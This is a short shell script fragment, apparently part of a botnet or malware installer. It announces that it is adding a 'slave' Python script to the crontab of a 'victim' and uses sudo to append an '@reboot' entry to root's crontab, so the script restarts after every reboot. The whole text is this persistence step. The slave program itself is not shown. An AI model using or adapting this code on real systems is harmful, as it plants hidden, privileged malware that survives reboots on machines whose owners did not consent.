PYTHON_SLAVE='/home/slave.py'
echo "Adding slave to crontab of victim. It will start after every reboot"
sudo crontab -l | { cat; echo "@reboot /bin/python2.7 ${PYTHON_SLAVE}"; } | sudo crontab -
